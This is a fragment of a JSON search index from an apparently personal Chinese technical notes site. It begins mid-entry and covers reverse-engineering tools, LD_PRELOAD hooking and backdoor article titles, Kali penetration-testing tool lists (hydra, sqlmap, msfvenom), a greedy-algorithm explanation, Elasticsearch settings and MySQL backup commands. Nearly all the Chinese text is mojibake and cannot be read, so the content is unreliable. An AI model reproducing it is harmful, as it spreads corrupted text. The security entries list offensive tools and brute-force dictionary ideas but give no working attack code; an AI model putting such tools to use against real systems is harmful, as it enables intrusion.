Linuxç¯å¢ƒå˜é‡æ˜¯ LD_PRELOAD","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html"},{"title":"WinDbg","text":"WinDbg æ˜¯ä¸€ä¸ªè°ƒè¯•å™¨ï¼Œå¯ç”¨äºåˆ†ææ•…éšœè½¬å‚¨ã€ è°ƒè¯•å®æ—¶ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼ä»£ç ï¼Œä»¥åŠæ£€æŸ¥ CPU å¯„å­˜å™¨å’Œå†…å­˜ã€‚ ä»…æ”¯æŒWindows å®˜ç½‘: å®‰è£… Windows è°ƒè¯•å™¨ å®˜ç½‘è°ƒè¯•æ•™ç¨‹: Windows è°ƒè¯•å…¥é—¨ çœ‹åˆ°ä¸ªå›¾æ–‡çš„ä½¿ç”¨: windbgä½¿ç”¨è¶…è¯¦ç»†æ•™ç¨‹","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Windbg.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Windbg.html"},{"title":"æ±‡ç¼–","text":"æ€ä¹ˆç”¨ å‚è€ƒ: å¦‚ä½•é˜…è¯»ç®€å•çš„æ±‡ç¼–(æŒç»­æ›´æ–°) é€†å‘å®æ“ã€x86/x64æ±‡ç¼–ã€IDA proé™æ€åˆ†æ å¸¸è§çº¦å®šå¯„å­˜å™¨å‚æ•°åŠä½œç”¨ å¯„å­˜å™¨ ä½œç”¨ %rax ä¼ é€’è¿”å›å€¼ %rdi ä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•° %rsi ä¼ é€’ç¬¬äºŒä¸ªå‚æ•° %rdx ä¼ é€’ç¬¬ä¸‰ä¸ªå‚æ•° %rcx ä¼ é€’ç¬¬å››ä¸ªå‚æ•° %r8 ä¼ é€’ç¬¬äº”ä¸ªå‚æ•° %r9 ä¼ é€’ç¬¬å…­ä¸ªå‚æ•° callee-owned %rsp æ ˆé¡¶æŒ‡é’ˆ caller-owned %rbx ä¸´æ—¶å˜é‡ caller-owned %rbp æ ˆåŸºæŒ‡ caller-owned %r12-%15 ä¸´æ—¶å˜é‡ caller-owned %rip å­˜å‚¨ä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤ %eflags flagså’Œæ¡ä»¶åˆ¤æ–­çš„ç»“æœæ ‡å¿—ä½ xmmO ç”¨æ¥ä¼ é€’ç¬¬ä¸€ä¸ªdouble å‚æ•° xmm1 ç”¨æ¥ä¼ é€’ç¬¬äºŒä¸ªdioubie åƒè´¹ SP æ ˆå¯„å­˜å™¨ LR ä¿å­˜å‡½æ•°è¿”å›åœ°å€ PC å½“å‰è¿è¡Œåˆ°çš„åœ°å€ R0-R3 ç”¨æ¥æ”¾å‡½æ•°çš„å‚æ•°ï¼Œæ‰§è¡Œå®Œåï¼ŒR0å­˜æ”¾è¿”å›å€¼ R4-R7 ç”¨æ¥æ”¾å‡½æ•°çš„å±€éƒ¨å˜é‡ æ³¨è§£ rdiæ˜¯8å­—èŠ‚çš„ï¼Œ4å­—èŠ‚çš„æ—¶å€™å¯¹åº”çš„å°±æ˜¯ediã€‚ callee-owned: å¦‚æœcallerè¦ä½¿ç”¨è¿™äº›å¯„å­˜æœºï¼Œé‚£ä¹ˆå®ƒåœ¨è°ƒç”¨calleeå‰ï¼Œè¦æŠŠè¿™äº›å¯„å­˜å™¨ä¿å­˜å¥½ã€‚ caller-owned: å¦‚æœcalleeè¦ä½¿ç”¨è¿™äº›å¯„å­˜å™¨ï¼Œé‚£ä¹ˆå®ƒå°±è¦ä¿å­˜å¥½è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Œå¹¶ä¸”è¿”å›åˆ°callerçš„æ—¶å€™è¦å°†è¿™äº›å€¼æ¢å¤ã€‚","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-compilation.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-compilation.html"},{"title":"é€†å‘å·¥ç¨‹","text":"ä¸»è¦æ˜¯åç¼–è¯‘è¿™æ–¹é¢çš„ å·¥å…·: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/frida Jadx: Javaåç¼–è¯‘å·¥å…·: Jadxé¡¹ç›®åœ°å€ Ghidra Cutter IDA IDA-é—®é¢˜æ€»ç»“ IDA-Pro OllyDbg WinDbg æ±‡ç¼– å®æˆ˜-Macä¸‹Hookå…¶ä»–è¿›ç¨‹ å®æˆ˜-Ubuntu16ä¸‹Hookç³»ç»Ÿçš„open ä¸€äº›æ²¡æ¥çš„åŠç ”ç©¶çš„Hookç›¸å…³ EAT Hook æŒ‚é’©æŠ€æœ¯ Inline Hook æŒ‚é’©æŠ€æœ¯ å…³äºç¯å¢ƒå˜é‡LD_PRELOADçš„åˆ©ç”¨ LD_PRELOAD åé—¨ | Linux åé—¨ç³»åˆ— åŸºäºLD_PRELOADçš„åŠ¨æ€åº“å‡½æ•°hook LD_PRELOADï¼Œpatchelf ä¸ hook","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-index.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-index.html"},{"title":"å­¦ä¹ è®°å½•","text":"æ¸—é€æµç¨‹ phpStudyæ­å»º DVWAé¶åœºæ­å»º Kaliä¿¡æ¯æ”¶é›† Kaliæ¼æ´åˆ†æåˆ©ç”¨ ä¸ºä»€ä¹ˆéœ€è¦ç¤¾å·¥åº“? å› ä¸ºå¤§å¤šæ•°äººçš„å¯†ç , è·Ÿè‡ªå·±çš„ç”Ÿæ—¥QQæ‰‹æœºå·ç­‰è‡ªå·±çš„ä¿¡æ¯ç›¸å…³ æ‰€ä»¥æœé›†å, æœ‰åˆ©äºè¿›è¡Œæ„å»ºçˆ†ç ´å­—å…¸ å¦‚ä½•å¢åŠ ç»éªŒ æŠ¤ç½‘ æŒ–æ¼æ´; CNVD; SRC é¶åœºå®æˆ˜, å¦‚ä½¿ç”¨Kaliå®˜æ–¹çš„: https://www.vulnhub.com/ å†™åšå®¢; å…¬ä¼—å· å¯ä»¥è¯•è¯•å»è€ƒçš„è¯ä¹¦: è¿˜æœ‰ä¸ªè½¯è€ƒä¿¡æ¯å®‰å…¨å·¥ç¨‹å¸ˆ å¯ä»¥å¹³æ—¶é€›é€›çš„: å‡ ä¹æ‰€æœ‰å›½å†…çš„å®‰å…¨SRC","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-index.html","loc":"/yq-doc-source-docs-Safety-Study-record-index.html"},{"title":"Brup","text":"macosä½¿ç”¨brup å·¥å…·-burpsuite","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-brup-index.html","loc":"/yq-doc-source-docs-Safety-brup-index.html"},{"title":"Kaliå‘½ä»¤å·¥å…·","text":"nmap: IP/ç«¯å£æ‰«æ maltego dirb: æœåŠ¡ç›®å½•æ‰«æ whatweb: æœåŠ¡æ¡†æ¶æ‰«æ, VUEå•¥çš„ cmseek: æŒ‡çº¹æ‰«æ msfconsole: äº¤äº’å¼æ¼æ´æœç´¢å·¥å…· hydra: æš´åŠ›ç ´è§£å¸å¯† medusa: æš´åŠ›ç ´è§£å¸å¯† sqlmap: æ¸—é€æ•°æ®åº“ wpscan: æ¼æ´æ‰«æ strings: ä»¥å­—ç¬¦ä¸²å½¢å¼ æŸ¥çœ‹å›¾ç‰‡ exiftool: æŸ¥çœ‹æ–‡ä»¶æ³¨é‡Š nc: nikto: wfuzz: çˆ†ç ´ whois: åŸŸåæ³¨å†Œä¿¡æ¯æ”¶é›† shodan: IPåœ°å€ä¿¡æ¯æ”¶é›† tor: ä½¿ç”¨ä»£ç†ä¼ªè£… æœ‰äº›å…¶å®æœ¬æ¥å°±æ˜¯linuxæŒ‡ä»¤, ä½†åœ¨æ™®é€šåœºæ™¯ä¸‹ä¸€èˆ¬ç”¨ä¸åˆ°, æ‰€ä»¥æ”¾åœ¨æ­¤å¤„. kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤ å¤‡å¿˜, äº‘æœåŠ¡å™¨å‚å•†. å›½å¤– msf msf/index","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-command-tool.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-command-tool.html"},{"title":"kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤","text":"cmseek dirb exiftool fcrackzip hydra maltego masscan medusa msfconsole nc nikto nmap shodan sqlmap strings tor wfuzz whatweb whois wpscan","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-index.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-index.html"},{"title":"MSFå·¥å…·","text":"./MSFç”Ÿæˆå„ç§Payload msfvenom","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-MSF-index.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-index.html"},{"title":"Kali","text":"mac m1å®‰è£…kali Kaliå®‰è£…é…ç½® Kaliå‘½ä»¤å·¥å…· msf","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-index.html","loc":"/yq-doc-source-docs-Safety-kali-index.html"},{"title":"è´ªå¿ƒç®—æ³•","text":"è´ªå¿ƒç­–ç•¥: å°†æ±‚è§£è¿‡ç¨‹åˆ†æˆè‹¥å¹²ä¸ªæ­¥éª¤ï¼Œ ä½†æ¯ä¸ªæ­¥éª¤éƒ½åº”ç”¨è´ªå¿ƒåŸåˆ™ï¼Œ é€‰å–å½“å‰çŠ¶æ€ä¸‹æœ€å¥½/æœ€ä¼˜çš„é€‰æ‹©ï¼ˆå±€éƒ¨æœ€æœ‰åˆ©çš„é€‰æ‹©ï¼‰ï¼Œ å¹¶ä»¥æ­¤å¸Œæœ›æœ€åå †å å‡ºçš„ç»“æœä¹Ÿæ˜¯æœ€å¥½/æœ€ä¼˜çš„è§£ã€‚ æ³¨è§£ ç”±äºæ˜¯é€‰å–çš„å±€éƒ¨æœ€ä¼˜, æ‰€ä»¥æœ€ç»ˆç»“æœä¸ä¸€æ ·æ˜¯å…¨å±€æœ€ä¼˜çš„ ä¸€èˆ¬æ­¥éª¤ ä»æŸä¸ªåˆå§‹è§£å‡ºå‘ï¼› é‡‡ç”¨è¿­ä»£çš„è¿‡ç¨‹ï¼Œå½“å¯ä»¥å‘ç›®æ ‡å‰è¿›ä¸€æ­¥æ—¶ï¼Œå°±æ ¹æ®å±€éƒ¨æœ€ä¼˜ç­–ç•¥ï¼Œå¾—åˆ°ä¸€éƒ¨åˆ†è§£ï¼Œç¼©å°é—®é¢˜è§„æ¨¡ï¼› å°†æ‰€æœ‰è§£ç»¼åˆèµ·æ¥ ä¾‹å­: éœ€è¦æ‰¾ç»™é¡¾å®¢41åˆ†é’±ï¼Œç°åœ¨çš„è´§å¸æœ‰ 25 åˆ†ã€20åˆ†ã€10 åˆ†ã€5 åˆ†å’Œ 1 åˆ†å››ç§ç¡¬å¸ï¼› è¯¥æ€ä¹ˆåŠï¼Ÿ æŒ‰ç…§è´ªå¿ƒçš„ä¸‰ä¸ªæ­¥éª¤: 41åˆ†ï¼Œå±€éƒ¨æœ€ä¼˜åŒ–åŸåˆ™ï¼Œå…ˆæ‰¾ç»™é¡¾å®¢25åˆ†ï¼› æ­¤æ—¶ï¼Œ41-25=16åˆ†ï¼Œè¿˜éœ€è¦æ‰¾ç»™é¡¾å®¢10åˆ†ï¼Œç„¶å5åˆ†ï¼Œç„¶å1åˆ†ï¼› æœ€ç»ˆï¼Œæ‰¾ç»™é¡¾å®¢ä¸€ä¸ª25åˆ†ï¼Œä¸€ä¸ª10åˆ†ï¼Œä¸€ä¸ª5åˆ†ï¼Œä¸€ä¸ª1åˆ†ï¼Œå…±å››æšç¡¬å¸ã€‚ æ˜¯ä¸æ˜¯è§‰å¾—å“ªé‡Œä¸å¤ªå¯¹ï¼Œå¦‚æœç»™ä»–2ä¸ª20åˆ†ï¼ŒåŠ ä¸€ä¸ª1åˆ†ï¼Œä¸‰æšç¡¬å¸å°±å¯ä»¥äº†å‘¢ï¼Ÿ&#94;_&#94;; æ€»ç»“ï¼šè´ªå¿ƒç­–ç•¥çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ ç®€å•ï¼Œé«˜æ•ˆï¼Œçœå»äº†ä¸ºäº†æ‰¾æœ€ä¼˜è§£å¯èƒ½éœ€è¦ç©·ä¸¾æ“ä½œï¼Œé€šå¸¸ä½œä¸ºå…¶å®ƒç®—æ³•çš„è¾…åŠ©ç­–ç•¥æ¥ä½¿ç”¨ï¼› ç¼ºç‚¹ ä¸ä»æ€»ä½“ä¸Šè€ƒè™‘å…¶å®ƒå¯èƒ½æƒ…å†µï¼Œæ¯æ¬¡é€‰å–å±€éƒ¨æœ€ä¼˜è§£ï¼Œä¸å†è¿›è¡Œå›æº¯å¤„ç†ï¼Œæ‰€ä»¥å¾ˆå°‘æƒ…å†µä¸‹å¾—åˆ°æœ€ä¼˜è§£ã€‚ æ³¨è§£ å½“ç„¶, å¦‚æœèƒ½æ¨å¯¼å‡º å±€éƒ¨æœ€ä¼˜è§£èƒ½å¤Ÿæ„æˆå…¨å±€æœ€ä¼˜è§£, é‚£ä¹ˆè´ªå¿ƒç­–ç•¥æ‰ç®—çœŸæ­£çš„è´ªå¿ƒç®—æ³• (è¿™é‡Œå•çº¯æ„ä¹‰ä¸ŠæŒ‡èƒ½æ±‚å‡ºæ­£ç¡®è§£çš„ç­–ç•¥æ‰æ˜¯ç®—æ³•) ä¸åŠ¨æ€è§„åˆ’çš„åŒºåˆ« è´ªå¿ƒç®—æ³•ä¸åŠ¨æ€è§„åˆ’çš„ä¸åŒåœ¨äºå®ƒå¯¹æ¯ä¸ªå­é—®é¢˜çš„è§£å†³æ–¹æ¡ˆéƒ½åšå‡ºé€‰æ‹©ï¼Œä¸èƒ½å›é€€ã€‚ åŠ¨æ€è§„åˆ’åˆ™ä¼šä¿å­˜ä»¥å‰çš„è¿ç®—ç»“æœï¼Œå¹¶æ ¹æ®ä»¥å‰çš„ç»“æœå¯¹å½“å‰è¿›è¡Œé€‰æ‹©ï¼Œæœ‰å›é€€åŠŸèƒ½ã€‚ åŸºäºè´ªå¿ƒç®—æ³•çš„ç®—æ³• Dijkstra(è¿ªæ°æ–¯ç‰¹æ‹‰)ç®—æ³•","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-Greedy-algorithm-index.html","loc":"/yq-doc-source-docs-data-structure-Greedy-algorithm-index.html"},{"title":"elasticsearch","text":"esé‡åˆ°çš„é—®é¢˜ ä»‹ç» é…ç½® ä½¿ç”¨çš„7.13çš„ç‰ˆæœ¬ï¼Œæœ‰ä¸€äº›é…ç½®è¿‡æ—¶äº†: | è¿‡æ—¶é…ç½® | é…ç½®ï¼ˆæ–°ï¼‰ | | :------------------------------: | :----------------------: | | discovery.zen.ping.unicast.hosts | discovery.seed_hosts | | discovery.zen.hosts_provider | discovery.seed_providers | | discovery.zen.nomasterblock | cluster.nomasterblock | discovery.seed_hosts æä¾›é›†ç¾¤ä¸­ç¬¦åˆä¸»æœºè¦æ±‚çš„èŠ‚ç‚¹çš„åˆ—è¡¨. æ¯ä¸ªå€¼çš„æ ¼å¼ä¸ºhost:portæˆ–host ï¼Œå…¶ä¸­porté»˜è®¤ä¸ºè®¾ç½®transport.profiles.default.portã€‚ discovery.seed_providers ä»¥æ–‡ä»¶çš„æ–¹å¼æä¾›ä¸»æœºåˆ—è¡¨ï¼Œå¯ä»¥åŠ¨æ€ä¿®æ”¹ï¼Œè€Œä¸ç”¨é‡å¯èŠ‚ç‚¹ï¼ˆå®¹å™¨åŒ–ç¯å¢ƒé€‚ç”¨ï¼‰ cluster.initial_master_nodes è®¾ç½®å…¨æ–°ç¾¤é›†ä¸­ç¬¦åˆä¸»æœºè¦æ±‚çš„èŠ‚ç‚¹çš„åˆå§‹é›†åˆ. é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥åˆ—è¡¨ä¸ºç©ºï¼Œè¿™æ„å‘³ç€è¯¥èŠ‚ç‚¹å¸Œæœ›åŠ å…¥å·²ç»è¢«å¼•å¯¼çš„é›†ç¾¤ discovery.findpeersinterval é€‰å®šä¸»èŠ‚ç‚¹å‘ç°æ—¶é—´é—´éš”,é»˜è®¤1S æ³¨è§£ è‡ªå·±æµ‹è¯•ä¸­å‘ç°å…·æœ‰é€‰ä¸¾æƒçš„masterèŠ‚ç‚¹ä¸€å®šè¦è®¾ç½®cluster.initial_master_nodesï¼Œ å€¼ä¸ºå½“å‰æ‰€æœ‰å¯ä»¥å‚ä¸é€‰ä¸¾çš„èŠ‚ç‚¹ï¼Œå¦åˆ™ä¼šå‡ºç° \"master not discovered yet\" çš„é”™è¯¯ï¼› émasterèŠ‚ç‚¹å¯ä»¥ä¸è®¾ç½®ï¼Œè®¾ç½®äº†åè€Œä¼šå‡ºç°çœŸæ­£çš„masterèŠ‚ç‚¹æ— æ³•å®æ—¶å‘ç°çš„é—®é¢˜ï¼Œ çŒœæµ‹åŸå› å¯èƒ½æ˜¯å› ä¸ºï¼Œå•ç‹¬çš„nodeèŠ‚ç‚¹å› ä¸ºè®¾ç½®äº†ï¼Œæ‰€ä»¥ä¸masterèŠ‚ç‚¹ä¸ä¼šä¸»åŠ¨å‘ç”Ÿé€šä¿¡ å®˜ç½‘æ–‡æ¡£å¦‚ä¸‹ Static Sets the initial set of master-eligible nodes in a brand-new cluster. By default this list is empty, meaning that this node expects to join a cluster that has already been bootstrapped. See cluster.initial_master_nodes . åœ¨å…¨æ–°çš„é›†ç¾¤ä¸­è®¾ç½®åˆå§‹ä¸»èŠ‚ç‚¹é›†ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªåˆ—è¡¨æ˜¯ç©ºçš„ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªèŠ‚ç‚¹å¸Œæœ›åŠ å…¥ä¸€ä¸ªå·²ç»è¢«å¼•å¯¼çš„é›†ç¾¤ã€‚ å…·å¤‡æˆä¸ºmasterèŠ‚ç‚¹çš„åº”è¯¥è®¾ç½®initial_master_nodesä¸ºä¸€ä¸ªmasteré›†ç¾¤åˆ—è¡¨ï¼Œ è€Œå…¶ä»–çš„nodeä¸ç”¨è®¾ç½®ï¼Œå¯ä»¥è‡ªå·±å¼•å¯¼ ï¼ˆæµ‹è¯•å‘ç°å¦‚æœéƒ½è®¾ç½®ï¼Œç¬¬ä¸€æ¬¡å¯åŠ¨é›†ç¾¤æ—¶ï¼ŒmasterèŠ‚ç‚¹å¿…é¡»æœ€åå¯åŠ¨æ‰å¯ä»¥å®Œå…¨å‘ç°æ‰€æœ‰çš„nodeï¼‰ æ›´æ–°ï¼Œæœ‰æ¯’å§ï¼Œå…¨è®¾ç½®äº†initial_master_nodesï¼Œåˆ é™¤äº†dataæ•°æ®åˆé‡æ–°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œ å±…ç„¶masterå¯ä»¥ä¸ç”¨æœ€åå¯åŠ¨äº†ä¹Ÿå¯ä»¥å…¨éƒ¨å‘ç°äº†ã€‚é‚£å°±æ˜¯æ˜¨å¤©æœ¬æœºç½‘ç»œæœ‰é—®é¢˜ï¼Ÿ åˆ†ç‰‡ä¸å‰¯æœ¬ åˆ†ç‰‡ å°†æ•°æ®åˆ†æˆå‡ ä»½ï¼Œä½¿ç”¨head-masterå¯ä»¥å¾ˆç›´è§‚çš„çœ‹å‡ºï¼Œ ä¾‹å¦‚è®¾ç½®åˆ†ç‰‡ï¼š5 å°±ä¼šåœ¨ä¸»é¡µå‡ºç°0,1,2,3,4äº”ä¸ªåˆ†ç‰‡ å‰¯æœ¬ å°±æ˜¯æ•°æ®çš„å¤‡ä»½ï¼Œ ä¾‹å¦‚åˆ†ç‰‡ä¸º5ï¼Œå‰¯æœ¬ä¸º1ï¼šå°±ä¼šå‡ºç°0,0,1,1,2,2,3,3,4,4ä¸€å…±åä¸ªåˆ†ç‰‡ï¼Œæœ‰ä¸€ä»½æ˜¯å‰¯æœ¬ å®˜æ–¹ï¼š ä¸€ä¸ªç´¢å¼•å¯ä»¥å­˜å‚¨è¶…å‡ºå•ä¸ªç»“ç‚¹ç¡¬ä»¶é™åˆ¶çš„å¤§é‡æ•°æ®ã€‚ æ¯”å¦‚ï¼Œä¸€ä¸ªå…·æœ‰10äº¿æ–‡æ¡£çš„ç´¢å¼•å æ®1TBçš„ç£ç›˜ç©ºé—´ï¼Œè€Œä»»ä¸€èŠ‚ç‚¹éƒ½æ²¡æœ‰è¿™æ ·å¤§çš„ç£ç›˜ç©ºé—´ï¼› æˆ–è€…å•ä¸ªèŠ‚ç‚¹å¤„ç†æœç´¢è¯·æ±‚ï¼Œå“åº”å¤ªæ…¢ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒElasticsearchæä¾›äº†å°†ç´¢å¼•åˆ’åˆ†æˆå¤šä»½çš„èƒ½åŠ›ï¼Œè¿™äº›ä»½å°±å«åšåˆ†ç‰‡ã€‚ å½“ä½ åˆ›å»ºä¸€ä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œä½ å¯ä»¥æŒ‡å®šä½ æƒ³è¦çš„åˆ†ç‰‡çš„æ•°é‡ã€‚ æ¯ä¸ªåˆ†ç‰‡æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œå–„å¹¶ä¸”ç‹¬ç«‹çš„\"ç´¢å¼•\"ï¼Œè¿™ä¸ª\"ç´¢å¼•\"å¯ä»¥è¢«æ”¾ç½®åˆ°é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹ä¸Šã€‚ åˆ†ç‰‡ä¹‹æ‰€ä»¥é‡è¦ï¼Œä¸»è¦æœ‰ä¸¤æ–¹é¢çš„åŸå› ï¼š å…è®¸ä½ æ°´å¹³åˆ†å‰²/æ‰©å±•ä½ çš„å†…å®¹å®¹é‡ å…è®¸ä½ åœ¨åˆ†ç‰‡ï¼ˆæ½œåœ¨åœ°ï¼Œä½äºå¤šä¸ªèŠ‚ç‚¹ä¸Šï¼‰ä¹‹ä¸Šè¿›è¡Œåˆ†å¸ƒå¼çš„ã€å¹¶è¡Œçš„æ“ä½œï¼Œè¿›è€Œæé«˜æ€§èƒ½/ååé‡ è‡³äºä¸€ä¸ªåˆ†ç‰‡æ€æ ·åˆ†å¸ƒï¼Œå®ƒçš„æ–‡æ¡£æ€æ ·èšåˆå›æœç´¢è¯·æ±‚ï¼Œ æ˜¯å®Œå…¨ç”±Elasticsearchç®¡ç†çš„ï¼Œå¯¹äºä½œä¸ºç”¨æˆ·çš„ä½ æ¥è¯´ï¼Œè¿™äº›éƒ½æ˜¯é€æ˜çš„ã€‚ åœ¨ä¸€ä¸ªç½‘ç»œ/äº‘çš„ç¯å¢ƒé‡Œï¼Œå¤±è´¥éšæ—¶éƒ½å¯èƒ½å‘ç”Ÿï¼Œ åœ¨æŸä¸ªåˆ†ç‰‡/èŠ‚ç‚¹ä¸çŸ¥æ€ä¹ˆçš„å°±å¤„äºç¦»çº¿çŠ¶æ€ï¼Œæˆ–è€…ç”±äºä»»ä½•åŸå› æ¶ˆå¤±äº†ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ä¸€ä¸ªæ•…éšœè½¬ç§»æœºåˆ¶æ˜¯éå¸¸æœ‰ç”¨å¹¶ä¸”æ˜¯å¼ºçƒˆæ¨èçš„ã€‚ ä¸ºæ­¤ç›®çš„ï¼ŒElasticsearchå…è®¸ä½ åˆ›å»ºåˆ†ç‰‡çš„ä¸€ä»½æˆ–å¤šä»½æ‹·è´ï¼Œè¿™äº›æ‹·è´å«åšå¤åˆ¶åˆ†ç‰‡ï¼Œæˆ–è€…ç›´æ¥å«å¤åˆ¶ã€‚ å¤åˆ¶ä¹‹æ‰€ä»¥é‡è¦ï¼Œä¸»è¦æœ‰ä¸¤æ–¹é¢çš„åŸå› ï¼š åœ¨åˆ†ç‰‡/èŠ‚ç‚¹å¤±è´¥çš„æƒ…å†µä¸‹ï¼Œæä¾›äº†é«˜å¯ç”¨æ€§ã€‚ å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæ³¨æ„åˆ°å¤åˆ¶åˆ†ç‰‡ä»ä¸ä¸åŸ/ä¸»è¦ï¼ˆoriginal/primaryï¼‰åˆ†ç‰‡ç½®äºåŒä¸€èŠ‚ç‚¹ä¸Šæ˜¯éå¸¸é‡è¦çš„ã€‚ æ‰©å±•ä½ çš„æœç´¢é‡/ååé‡ï¼Œå› ä¸ºæœç´¢å¯ä»¥åœ¨æ‰€æœ‰çš„å¤åˆ¶ä¸Šå¹¶è¡Œè¿è¡Œ æ€»ä¹‹ï¼Œæ¯ä¸ªç´¢å¼•å¯ä»¥è¢«åˆ†æˆå¤šä¸ªåˆ†ç‰‡ã€‚ ä¸€ä¸ªç´¢å¼•ä¹Ÿå¯ä»¥è¢«å¤åˆ¶0æ¬¡ï¼ˆæ„æ€æ˜¯æ²¡æœ‰å¤åˆ¶ï¼‰æˆ–å¤šæ¬¡ã€‚ ä¸€æ—¦å¤åˆ¶äº†ï¼Œæ¯ä¸ªç´¢å¼•å°±æœ‰äº†ä¸»åˆ†ç‰‡ï¼ˆä½œä¸ºå¤åˆ¶æºçš„åŸæ¥çš„åˆ†ç‰‡ï¼‰å’Œå¤åˆ¶åˆ†ç‰‡ï¼ˆä¸»åˆ†ç‰‡çš„æ‹·è´ï¼‰ä¹‹åˆ«ã€‚ åˆ†ç‰‡å’Œå¤åˆ¶çš„æ•°é‡å¯ä»¥åœ¨ç´¢å¼•åˆ›å»ºçš„æ—¶å€™æŒ‡å®šã€‚ åœ¨ç´¢å¼•åˆ›å»ºä¹‹åï¼Œä½ å¯ä»¥åœ¨ä»»ä½•æ—¶å€™åŠ¨æ€åœ°æ”¹å˜å¤åˆ¶æ•°é‡ï¼Œä½†æ˜¯ä¸èƒ½æ”¹å˜åˆ†ç‰‡çš„æ•°é‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒElasticsearchä¸­çš„æ¯ä¸ªç´¢å¼•è¢«åˆ†ç‰‡5ä¸ªä¸»åˆ†ç‰‡å’Œ1ä¸ªå¤åˆ¶ï¼Œ è¿™æ„å‘³ç€ï¼Œå¦‚æœä½ çš„é›†ç¾¤ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä½ çš„ç´¢å¼•å°†ä¼šæœ‰5ä¸ªä¸»åˆ†ç‰‡å’Œå¦å¤–5ä¸ªå¤åˆ¶åˆ†ç‰‡ï¼ˆ1ä¸ªå®Œå…¨æ‹·è´ï¼‰ï¼Œ è¿™æ ·çš„è¯æ¯ä¸ªç´¢å¼•æ€»å…±å°±æœ‰10ä¸ªåˆ†ç‰‡ã€‚ ä¸€ä¸ªç´¢å¼•çš„å¤šä¸ªåˆ†ç‰‡å¯ä»¥å­˜æ”¾åœ¨é›†ç¾¤ä¸­çš„ä¸€å°ä¸»æœºä¸Šï¼Œä¹Ÿå¯ä»¥å­˜æ”¾åœ¨å¤šå°ä¸»æœºä¸Šï¼Œè¿™å–å†³äºä½ çš„é›†ç¾¤æœºå™¨æ•°é‡ã€‚ ä¸»åˆ†ç‰‡å’Œå¤åˆ¶åˆ†ç‰‡çš„å…·ä½“ä½ç½®æ˜¯ç”±ESå†…åœ¨çš„ç­–ç•¥æ‰€å†³å®šçš„ã€‚","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-elasticsearch-index.html","loc":"/yq-doc-source-docs-database-elasticsearch-index.html"},{"title":"mysql","text":"ç´¢å¼• æŸ¥è¯¢é€‰é¡¹ explainä¼˜åŒ– MVCC mysqlå¤‡ä»½æ–¹æ¡ˆ æ•°æ®åº“å¼•æ“ ä¸»ä»åŒæ­¥ é” å…¶ä»–é—®é¢˜ ç´¢å¼•æ•°æ®ç»“æ„ äº‹åŠ¡ åˆ†åº“åˆ†è¡¨ 8.0æ–°ç‰¹æ€§ æ¦‚å¿µåŸºç¡€ è¡¨å†…å¤–è¿æ¥ onã€whereã€Havingçš„åŒºåˆ« mysql base é¢„å®šä¹‰å˜é‡: @@datadir æ•°æ®è·¯å¾„ @@basedir mysqlå®‰è£…è·¯å¾„ @@version_compile_os mysqlå®‰è£…çš„ç³»ç»Ÿ å¤‡ä»½ å¤‡ä»½æŸä¸€ä¸ªè¡¨: mysqldump -uroot -p $database $table >/tmp/t.sql å…¨éƒ¨å¤‡ä»½: mysqldump -uroot -p -ARE --triggers --master-data=2 --single-transaction >/tmp/full.sql å…¶ä»–è¯¦ç»†ä¿¡æ¯è§: /docs/æ•°æ®åº“/mysql/mysqlå¤‡ä»½æ–¹æ¡ˆ æ³¨é‡Š å•è¡Œ: # select -- select å¤šè¡Œ: /* select */ å…³äºå­—ç¬¦é›†ä¿®æ”¹ ç›´æ¥ä¿®æ”¹æ•°æ®è¡¨çš„å­—ç¬¦é›†ä¸ä¸€å®šè¡Œ, å¾—åˆ é™¤è¡¨é‡æ–°å»ºè¡¨çš„æ—¶å€™å¼„å­—ç¬¦é›† ç›´æ¥ä¿®æ”¹å­—ç¬¦é›†ï¼ˆä¸ä¸€å®šæœ‰ç”¨ï¼‰: select concat( 'alter table ', TABLE_NAME, ' convert to character set utf8mb4 collate utf8mb4_general_ci;' ) from information_schema.'TABLES' where TABLE_SCHEMA = '$database'; 